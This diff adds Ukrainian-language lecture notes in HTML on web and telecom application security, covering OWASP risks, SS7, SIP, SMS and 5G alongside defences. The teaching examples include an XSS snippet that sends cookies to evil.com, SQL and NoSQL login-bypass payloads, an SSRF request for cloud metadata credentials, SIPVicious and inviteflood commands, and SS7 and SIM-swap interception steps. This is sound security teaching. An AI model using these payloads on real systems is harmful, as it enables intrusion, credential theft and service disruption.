@@ -1,0 +1,439 @@
+<!doctype html>
+<html lang="uk">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Конспект: Безпека веб- та телеком-застосунків — Лекція 7</title>
+    <style>
+        *, *::before, *::after { box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background: #0d1117;
+            color: #c9d1d9;
+            margin: 0;
+            padding: 0;
+            line-height: 1.65;
+        }
+        .page { max-width: 960px; margin: 0 auto; padding: 2rem 1.5rem 4rem; }
+        header { border-bottom: 2px solid #21262d; padding-bottom: 1.5rem; margin-bottom: 2rem; }
+        header h1 { font-size: 1.8rem; color: #58a6ff; margin: 0 0 0.4rem; }
+        header .meta { font-size: 0.85rem; color: #8b949e; }
+        header .meta span { margin-right: 1.2em; }
+        .toc { background: #161b22; border: 1px solid #21262d; border-radius: 8px; padding: 1rem 1.5rem; margin-bottom: 2.5rem; }
+        .toc h2 { font-size: 1rem; color: #e8b04b; margin: 0 0 0.6rem; }
+        .toc ol { margin: 0; padding-left: 1.4em; }
+        .toc li { margin: 0.25em 0; }
+        .toc a { color: #58a6ff; text-decoration: none; }
+        .toc a:hover { text-decoration: underline; }
+        h2 { color: #58a6ff; font-size: 1.4rem; border-bottom: 1px solid #21262d; padding-bottom: 0.4rem; margin-top: 2.5rem; }
+        h3 { color: #e8b04b; font-size: 1.1rem; margin-top: 1.5rem; }
+        h4 { color: #c9d1d9; font-size: 1rem; margin-top: 1.2rem; }
+        code { background: #161b22; color: #58a6ff; padding: 2px 6px; border-radius: 4px; font-size: 0.9em; }
+        pre { background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 1rem; overflow-x: auto; margin: 1rem 0; }
+        pre code { background: none; color: #c9d1d9; padding: 0; font-size: 0.85em; line-height: 1.5; }
+        table { width: 100%; border-collapse: collapse; margin: 1rem 0; font-size: 0.9em; }
+        th { background: #1f6feb; color: #fff; padding: 8px 12px; text-align: left; }
+        td { padding: 7px 12px; border-bottom: 1px solid #21262d; }
+        tr:hover td { background: #161b22; }
+        blockquote { border-left: 3px solid #e8b04b; margin: 1rem 0; padding: 0.5rem 1rem; background: #161b22; border-radius: 0 6px 6px 0; color: #8b949e; }
+        ul, ol { padding-left: 1.5em; }
+        li { margin: 0.3em 0; }
+        .badge { display: inline-block; padding: 2px 8px; border-radius: 12px; font-size: 0.75em; font-weight: bold; margin: 1px; }
+        .badge-blue { background: #1f6feb; color: #fff; }
+        .badge-green { background: #238636; color: #fff; }
+        .badge-red { background: #da3633; color: #fff; }
+        .badge-yellow { background: #9e6a03; color: #fff; }
+        a { color: #58a6ff; }
+    </style>
+</head>
+<body>
+<div class="page">
+    <header>
+        <h1>Лекція 7 — Безпека веб- та телеком-застосунків</h1>
+        <div class="meta">
+            <span>📚 Курс: Інформаційна безпека телекомунікаційних та хмарних технологій</span>
+            <span>📑 Модуль 2</span>
+            <span>🎯 38 слайдів</span>
+        </div>
+    </header>
+
+    <div class="toc">
+        <h2>📋 Зміст</h2>
+        <ol>
+            <li><a href="#web-security">Безпека веб-застосунків (30%)</a>
+                <ol>
+                    <li><a href="#threat-landscape">Ландшафт загроз</a></li>
+                    <li><a href="#owasp-top10">OWASP Top 10 (2021)</a></li>
+                    <li><a href="#injection">Ін'єкційні атаки</a></li>
+                    <li><a href="#auth">Аутентифікація та сесії</a></li>
+                    <li><a href="#xss">XSS</a></li>
+                    <li><a href="#csrf-ssrf">CSRF та SSRF</a></li>
+                    <li><a href="#idor">IDOR та Access Control</a></li>
+                    <li><a href="#waf">WAF</a></li>
+                    <li><a href="#tls">HTTPS та TLS</a></li>
+                    <li><a href="#api">Безпека API</a></li>
+                    <li><a href="#devsecops-web">DevSecOps для веб</a></li>
+                </ol>
+            </li>
+            <li><a href="#telecom-security">Безпека телеком-застосунків (55%)</a>
+                <ol>
+                    <li><a href="#ss7">SS7 — вразливості та захист</a></li>
+                    <li><a href="#diameter-gtp">Diameter та GTP</a></li>
+                    <li><a href="#sip">VoIP та SIP</a></li>
+                    <li><a href="#sms">SMS-безпека</a></li>
+                    <li><a href="#5g">5G безпека</a></li>
+                    <li><a href="#telecom-api">Telecom APIs</a></li>
+                    <li><a href="#mobile">Мобільні застосунки</a></li>
+                    <li><a href="#fraud">Telecom Fraud</a></li>
+                </ol>
+            </li>
+            <li><a href="#cloud-devsecops">Хмара та DevSecOps (15%)</a></li>
+        </ol>
+    </div>
+
+    <!-- ===== РОЗДІЛ 1: ВЕБ ===== -->
+    <h2 id="web-security">1. Безпека веб-застосунків</h2>
+
+    <h3 id="threat-landscape">1.1 Ландшафт загроз</h3>
+    <p>Веб-застосунки є найбільшою поверхнею атаки для більшості організацій. За даними <strong>Verizon DBIR 2023</strong>, 43% порушень даних пов'язані з атаками на веб-застосунки.</p>
+
+    <table>
+        <tr><th>Вектор атаки</th><th>Приклади</th></tr>
+        <tr><td><strong>Client-side</strong></td><td>XSS, CSRF, Clickjacking, DOM manipulation</td></tr>
+        <tr><td><strong>Server-side</strong></td><td>SQL Injection, SSRF, Deserialization, RCE</td></tr>
+        <tr><td><strong>Infrastructure</strong></td><td>DDoS, TLS Downgrade, DNS Hijacking, MITM</td></tr>
+        <tr><td><strong>API</strong></td><td>BOLA, Mass Assignment, Rate Limit bypass</td></tr>
+    </table>
+
+    <h3 id="owasp-top10">1.2 OWASP Top 10 (2021)</h3>
+    <table>
+        <tr><th>#</th><th>Категорія</th><th>Приклад</th><th>Захист</th></tr>
+        <tr><td><span class="badge badge-red">A01</span></td><td>Broken Access Control</td><td>IDOR, privilege escalation</td><td>Серверна авторизація, UUID</td></tr>
+        <tr><td><span class="badge badge-red">A02</span></td><td>Cryptographic Failures</td><td>Hardcoded keys, MD5</td><td>AES-256, TLS 1.3</td></tr>
+        <tr><td><span class="badge badge-red">A03</span></td><td>Injection</td><td>SQLi, NoSQLi, OS command</td><td>Prepared statements</td></tr>
+        <tr><td><span class="badge badge-yellow">A04</span></td><td>Insecure Design</td><td>Відсутність threat modeling</td><td>STRIDE, threat modeling</td></tr>
+        <tr><td><span class="badge badge-yellow">A05</span></td><td>Security Misconfiguration</td><td>Debug mode, default паролі</td><td>Hardening, IaC scanning</td></tr>
+        <tr><td><span class="badge badge-yellow">A06</span></td><td>Vulnerable Components</td><td>Log4Shell, Struts</td><td>SCA, patching</td></tr>
+        <tr><td><span class="badge badge-yellow">A07</span></td><td>Auth Failures</td><td>Brute force, слабкі паролі</td><td>MFA, rate limiting</td></tr>
+        <tr><td><span class="badge badge-blue">A08</span></td><td>Integrity Failures</td><td>CI/CD компрометація</td><td>SBOM, code signing</td></tr>
+        <tr><td><span class="badge badge-blue">A09</span></td><td>Logging Failures</td><td>Відсутність логів безпеки</td><td>SIEM, CloudTrail</td></tr>
+        <tr><td><span class="badge badge-blue">A10</span></td><td>SSRF</td><td>Запити до metadata API</td><td>Allowlist, IMDSv2</td></tr>
+    </table>
+
+    <h3 id="injection">1.3 Ін'єкційні атаки</h3>
+    <h4>SQL Injection</h4>
+    <pre><code>-- Вразливий запит (PHP)
+$query = "SELECT * FROM users WHERE username='" . $_GET['user'] . "'";
+
+-- Атака: user = admin'--
+-- Результат: SELECT * FROM users WHERE username='admin'--'
+-- Коментар "--" закриває перевірку пароля → доступ без пароля!
+
+-- Захист: Prepared Statements (Java)
+PreparedStatement ps = conn.prepareStatement(
+    "SELECT * FROM users WHERE username=? AND password=?"
+);
+ps.setString(1, username);
+ps.setString(2, password);</code></pre>
+
+    <h4>NoSQL Injection (MongoDB)</h4>
+    <pre><code>// Атака через JSON body
+POST /api/login
+{"username": {"$ne": null}, "password": {"$ne": null}}
+// Умова $ne:null завжди true → вхід без знання пароля!
+
+// Захист: schema validation (Joi)
+const schema = Joi.object({
+  username: Joi.string().alphanum().required(),
+  password: Joi.string().required()
+});</code></pre>
+
+    <h3 id="auth">1.4 Аутентифікація та управління сесіями</h3>
+    <table>
+        <tr><th>Вразливість</th><th>Опис</th><th>Захист</th></tr>
+        <tr><td>Brute force</td><td>Перебір паролів</td><td>Rate limiting, captcha, lockout</td></tr>
+        <tr><td>Credential stuffing</td><td>Витоклі паролі з інших сервісів</td><td>MFA, Have I Been Pwned check</td></tr>
+        <tr><td>Session hijacking</td><td>Крадіжка session cookie</td><td>HttpOnly, Secure, SameSite</td></tr>
+        <tr><td>JWT alg:none</td><td>Відключення підпису JWT</td><td>Перевіряти alg, використовувати RS256</td></tr>
+        <tr><td>Weak secret</td><td>JWT підписаний слабким HMAC секретом</td><td>Мін. 32 байти ентропії, rotate</td></tr>
+    </table>
+
+    <h3 id="xss">1.5 XSS — Cross-Site Scripting</h3>
+    <p><strong>Stored XSS приклад:</strong></p>
+    <pre><code>&lt;!-- Зловмисник зберігає в коментарі: --&gt;
+&lt;script&gt;
+  fetch('https://evil.com/steal?c=' + document.cookie);
+&lt;/script&gt;
+
+&lt;!-- Захист: CSP header --&gt;
+Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'
+
+&lt;!-- Захист: Output encoding (PHP) --&gt;
+echo htmlspecialchars($comment, ENT_QUOTES, 'UTF-8');</code></pre>
+
+    <h3 id="csrf-ssrf">1.6 CSRF та SSRF</h3>
+    <h4>CSRF</h4>
+    <pre><code>&lt;!-- Шкідлива сторінка зловмисника --&gt;
+&lt;img src="https://bank.com/transfer?to=attacker&amp;amount=5000"&gt;
+&lt;!-- Браузер автоматично надсилає cookie сесії банку! --&gt;
+
+&lt;!-- Захист: CSRF токен у формі --&gt;
+&lt;input type="hidden" name="csrf_token" value="random_token_per_session"&gt;</code></pre>
+
+    <h4>SSRF — Capital One (2019)</h4>
+    <pre><code>POST /api/fetch-url
+Body: {"url": "http://169.254.169.254/latest/meta-data/iam/credentials"}
+
+Response:
+{
+  "AccessKeyId": "ASIA...",
+  "SecretAccessKey": "wJalr...",
+  "Token": "AQoD..."
+}
+→ Зловмисник отримав IAM credentials → 100M+ записів клієнтів</code></pre>
+
+    <h3 id="idor">1.7 IDOR та Broken Access Control</h3>
+    <pre><code># Вразливий URL
+GET /api/accounts/1001/balance   ← свій рахунок
+GET /api/accounts/1002/balance   ← чужий рахунок → 200 OK (IDOR!)
+
+# Захист: UUID + серверна перевірка
+GET /api/accounts/7f3a9c2b-4e1d.../balance
+
+# Сервер перевіряє:
+if account.owner_id != current_user.id:
+    return 403 Forbidden</code></pre>
+
+    <h3 id="waf">1.8 Web Application Firewall (WAF)</h3>
+    <table>
+        <tr><th>AWS WAF Компонент</th><th>Опис</th></tr>
+        <tr><td>AWSManagedRulesCommonRuleSet</td><td>OWASP Core Rule Set — базовий захист</td></tr>
+        <tr><td>AWSManagedRulesSQLiRuleSet</td><td>SQL Injection patterns</td></tr>
+        <tr><td>AWSManagedRulesKnownBadInputsRuleSet</td><td>Log4Shell, Spring4Shell</td></tr>
+        <tr><td>Rate-based Rules</td><td>IP обмеження за 5-хв вікном</td></tr>
+        <tr><td>Bot Control</td><td>Виявлення ботів, CAPTCHA challenge</td></tr>
+    </table>
+    <blockquote>WAF не є єдиним засобом захисту. Обходи: URL-encoding, case variations, whitespace. Використовуйте Defence in Depth.</blockquote>
+
+    <h3 id="tls">1.9 HTTPS та TLS</h3>
+    <pre><code># Захисні HTTP заголовки
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+Content-Security-Policy: default-src 'self'; script-src 'self'
+X-Content-Type-Options: nosniff
+X-Frame-Options: DENY
+Referrer-Policy: strict-origin-when-cross-origin
+Permissions-Policy: geolocation=(), microphone=()</code></pre>
+
+    <h3 id="api">1.10 Безпека API</h3>
+    <table>
+        <tr><th>OWASP API Top 10</th><th>Опис</th><th>Приклад</th></tr>
+        <tr><td>API1 — BOLA</td><td>Object-level auth failure</td><td>GET /invoices/{other_id}</td></tr>
+        <tr><td>API2 — Auth Failures</td><td>Слабка автентифікація</td><td>Відсутній token validation</td></tr>
+        <tr><td>API4 — Resource Consumption</td><td>Без rate limiting</td><td>10K req/sec → DoS</td></tr>
+        <tr><td>API7 — SSRF</td><td>Через webhook URLs</td><td>webhook=http://internal/secret</td></tr>
+        <tr><td>API9 — Improper Inventory</td><td>Тіньові API</td><td>/v1/admin/debug незадокументований</td></tr>
+    </table>
+
+    <h3 id="devsecops-web">1.11 DevSecOps для веб</h3>
+    <table>
+        <tr><th>Фаза</th><th>Тип</th><th>Інструмент</th></tr>
+        <tr><td>Pre-commit</td><td>Secrets</td><td>GitLeaks, git-secrets</td></tr>
+        <tr><td>Build</td><td>SAST</td><td>Semgrep, SonarQube</td></tr>
+        <tr><td>Build</td><td>SCA</td><td>OWASP Dependency-Check, Snyk</td></tr>
+        <tr><td>Test</td><td>DAST</td><td>OWASP ZAP, Burp Suite</td></tr>
+        <tr><td>Deploy</td><td>IaC</td><td>Checkov, tfsec</td></tr>
+        <tr><td>Runtime</td><td>WAF+SIEM</td><td>AWS WAF, GuardDuty</td></tr>
+    </table>
+
+    <!-- ===== РОЗДІЛ 2: ТЕЛЕКОМ ===== -->
+    <h2 id="telecom-security">2. Безпека телеком-застосунків</h2>
+
+    <h3 id="ss7">2.1 SS7 — вразливості та захист</h3>
+    <p>SS7 розроблений у <strong>1975 році</strong> — відсутність автентифікації між операторами. Доступ до SS7 можна купити за ~$1000/міс через сірих операторів.</p>
+
+    <table>
+        <tr><th>Атака</th><th>SS7 повідомлення</th><th>Наслідок</th></tr>
+        <tr><td>Location tracking</td><td>SRI + PSI</td><td>Відстеження локації абонента</td></tr>
+        <tr><td>SMS interception</td><td>UpdateLocation + MO-ForwardSM</td><td>Перехоплення OTP</td></tr>
+        <tr><td>Call forwarding</td><td>RegisterSS</td><td>MITM дзвінків</td></tr>
+        <tr><td>DoS</td><td>CancelLocation</td><td>Абонент недоступний</td></tr>
+    </table>
+
+    <pre><code>Атака перехоплення SMS (покрокова):
+1. Зловмисник (з SS7 доступом) надсилає UpdateLocation → HLR жертви
+   Параметри: IMSI жертви, адреса "фальшивого MSC" зловмисника
+
+2. HLR оновлює запис → SMS тепер маршрутизуються через MSC зловмисника
+
+3. Жертва запитує OTP для банку → SMS → зловмисник
+   Зловмисник → входить до банківського акаунту</code></pre>
+
+    <p><strong>Захист:</strong> SMS Home Routing, SS7 Firewall (GSMA FS.11 категорії 1-3), міграція на 5G.</p>
+
+    <h3 id="diameter-gtp">2.2 Diameter та GTP</h3>
+    <h4>Diameter (4G/LTE)</h4>
+    <table>
+        <tr><th>Вузол</th><th>Роль</th><th>Ризики</th></tr>
+        <tr><td>HSS</td><td>База абонентів</td><td>ULR → location disclosure</td></tr>
+        <tr><td>MME</td><td>Mobility management</td><td>CLR → DoS абонента</td></tr>
+        <tr><td>PCRF</td><td>Policy/Charging</td><td>Policy manipulation</td></tr>
+    </table>
+
+    <h4>GTP</h4>
+    <pre><code># Cell Spoofing Attack — підроблений Create Session Request
+GTPv2-C Create Session Request:
+  IMSI: 255010123456789   ← підроблений IMSI жертви
+  APN: internet
+  Sender: attacker_SGSN
+
+→ Оператор створює PDP context для "жертви"
+→ Трафік жертви проходить через зловмисника</code></pre>
+
+    <h3 id="sip">2.3 VoIP та SIP безпека</h3>
+    <pre><code># Registration Hijacking
+REGISTER sip:telecom.ua SIP/2.0
+From: &lt;sip:alice@telecom.ua&gt;
+Contact: &lt;sip:alice@attacker-ip&gt;  ← підроблений Contact
+→ Дзвінки для Alice → зловмисник
+
+# INVITE Flooding (DoS)
+# SIPVicious tool:
+svmap 192.168.1.0/24        # scan for SIP devices
+svwar -e100-200 192.168.1.1 # enumerate extensions
+inviteflood eth0 target user 192.168.1.1 5000</code></pre>
+
+    <table>
+        <tr><th>Атака</th><th>Захист</th></tr>
+        <tr><td>Registration Hijacking</td><td>Digest Auth + TLS (SIPS)</td></tr>
+        <tr><td>INVITE Flooding</td><td>SBC rate limiting</td></tr>
+        <tr><td>Eavesdropping RTP</td><td>SRTP (RFC 3711)</td></tr>
+        <tr><td>Toll Fraud</td><td>ACL + Auth для INVITE</td></tr>
+    </table>
+
+    <h3 id="sms">2.4 SMS-безпека</h3>
+    <pre><code>SIM Swap атака:
+1. OSINT: ім'я, дата народження, адреса жертви
+2. Дзвінок оператору: соціальна інженерія → перевипуск SIM
+   АБО SS7 UpdateLocation → SMS перенаправляються
+3. Зловмисник отримує всі SMS, включно з OTP банку
+4. Повний доступ до банківського акаунту
+
+Статистика: FBI IC3 2022 — $72.7M збитків від SIM swap</code></pre>
+    <blockquote><strong>NIST SP 800-63B</strong> рекомендує уникати SMS OTP для критичних систем. Використовуйте TOTP (Google Authenticator) або FIDO2/WebAuthn.</blockquote>
+
+    <h3 id="5g">2.5 5G безпека</h3>
+    <table>
+        <tr><th>Функція</th><th>4G</th><th>5G</th></tr>
+        <tr><td>IMSI захист</td><td>Відкритий IMSI (IMSI catcher!)</td><td>SUCI = encrypt(SUPI, ephemeral_key)</td></tr>
+        <tr><td>Аутентифікація</td><td>EPS-AKA</td><td>5G-AKA + EAP-AKA'</td></tr>
+        <tr><td>Роумінговий захист</td><td>Відсутній</td><td>SEPP + N32 + JOSE</td></tr>
+        <tr><td>API безпека</td><td>Proprietary</td><td>OAuth 2.0 + TLS (SBA)</td></tr>
+        <tr><td>Стандарт</td><td>3GPP TS 33.401</td><td>3GPP TS 33.501</td></tr>
+    </table>
+
+    <h3 id="telecom-api">2.6 Telecom APIs</h3>
+    <pre><code># Приклад BOLA у Telecom API
+GET /api/v1/subscriber/380501234567/location
+Authorization: Bearer {токен іншого абонента}
+
+HTTP/1.1 200 OK
+{"lat": 50.4501, "lon": 30.5234}   ← BOLA! Доступ до локації без авторизації
+
+# Захист
+- Server-side перевірка: subscriber_id == token.sub
+- Scope обмеження в OAuth: location:read лише для свого номера
+- API Gateway rate limiting: 10 req/min per subscriber</code></pre>
+
+    <h3 id="mobile">2.7 Мобільні застосунки — OWASP Mobile Top 10</h3>
+    <table>
+        <tr><th>Категорія</th><th>Ризик</th><th>Захист</th></tr>
+        <tr><td>M1 — Improper Credential Usage</td><td>Hardcoded keys в APK</td><td>Android Keystore, Secure Enclave</td></tr>
+        <tr><td>M5 — Insecure Communication</td><td>HTTP, слабкий TLS</td><td>HTTPS + certificate pinning</td></tr>
+        <tr><td>M7 — Binary Protections</td><td>Легкий реверс-інжиніринг</td><td>ProGuard, R8, RASP</td></tr>
+        <tr><td>M9 — Insecure Data Storage</td><td>Plaintext у SharedPrefs</td><td>EncryptedSharedPreferences</td></tr>
+        <tr><td>M10 — Insufficient Cryptography</td><td>MD5, кастомна крипто</td><td>AES-256-GCM, stdlib</td></tr>
+    </table>
+
+    <h3 id="fraud">2.8 Telecom Fraud</h3>
+    <table>
+        <tr><th>Тип шахрайства</th><th>Схема</th><th>Збитки/рік</th></tr>
+        <tr><td>IRSF</td><td>Дзвінки на premium номери → revenue share</td><td>$6.1B</td></tr>
+        <tr><td>PBX Fraud</td><td>Злом корпоративних АТС</td><td>$4B</td></tr>
+        <tr><td>Wangiri</td><td>Пропущений дзвінок → передзвон на premium</td><td>$1-2B</td></tr>
+        <tr><td>SIM Box</td><td>VoIP через SIM → ухилення від оплати</td><td>Значні</td></tr>
+    </table>
+    <blockquote><strong>CFCA 2021:</strong> Загальні збитки від телеком-шахрайства — <strong>$38.95 мільярдів</strong> на рік глобально.</blockquote>
+
+    <!-- ===== РОЗДІЛ 3: ХМАРА ===== -->
+    <h2 id="cloud-devsecops">3. Хмара та DevSecOps</h2>
+
+    <h3>3.1 AWS WAF та Shield</h3>
+    <pre><code># Прив'язка AWS WAF до API Gateway
+aws wafv2 associate-web-acl \
+  --web-acl-arn arn:aws:wafv2:eu-west-1:123456789:regional/webacl/MyACL/xxx \
+  --resource-arn arn:aws:apigateway:eu-west-1::/restapis/abc123/stages/prod
+
+# Rate-based правило для захисту /login
+{
+  "Name": "RateLimitLogin", "Priority": 1,
+  "Action": {"Block": {}},
+  "Statement": {
+    "RateBasedStatement": {
+      "Limit": 100,
+      "AggregateKeyType": "IP",
+      "ScopeDownStatement": {
+        "ByteMatchStatement": {
+          "SearchString": "/api/auth/login",
+          "FieldToMatch": {"UriPath": {}},
+          "PositionalConstraint": "STARTS_WITH"
+        }
+      }
+    }
+  }
+}</code></pre>
+
+    <h3>3.2 DevSecOps Pipeline</h3>
+    <pre><code># GitHub Actions security pipeline
+name: Security
+on: [push, pull_request]
+jobs:
+  security:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+
+      # Пошук витоків секретів
+      - uses: gitleaks/gitleaks-action@v2
+
+      # SAST
+      - uses: returntocorp/semgrep-action@v1
+        with: {config: "p/owasp-top-ten p/jwt"}
+
+      # Dependency scanning
+      - name: Snyk
+        run: snyk test --severity-threshold=high
+
+      # Container scanning
+      - name: Trivy
+        uses: aquasecurity/trivy-action@master
+        with: {image-ref: "my-app:latest", severity: "HIGH,CRITICAL"}</code></pre>
+
+    <h3>3.3 Compliance</h3>
+    <table>
+        <tr><th>Стандарт</th><th>Область</th><th>Ключова вимога</th></tr>
+        <tr><td>PCI DSS v4.0</td><td>Веб/API для платежів</td><td>Req 6.4: WAF або code review</td></tr>
+        <tr><td>GDPR</td><td>Персональні дані ЄС</td><td>Privacy by design, breach 72h</td></tr>
+        <tr><td>NIS2</td><td>Критична інфраструктура (телеком)</td><td>Risk management, incident report 24h</td></tr>
+        <tr><td>OWASP ASVS</td><td>Верифікація застосунків</td><td>L1/L2/L3 рівні</td></tr>
+        <tr><td>GSMA FS.11</td><td>SS7 мережі</td><td>Категорії загроз 1-7</td></tr>
+        <tr><td>3GPP TS 33.501</td><td>5G мережі</td><td>SUCI, SEPP, SBA OAuth</td></tr>
+    </table>
+
+    <hr style="border-color: #21262d; margin: 3rem 0 1.5rem;">
+    <p style="color: #8b949e; font-size: 0.85em; text-align: center;">
+        Лекція 7 | Безпека веб- та телеком-застосунків<br>
+        Курс: Інформаційна безпека телекомунікаційних та хмарних технологій
+    </p>
+</div>
+</body>
+</html>
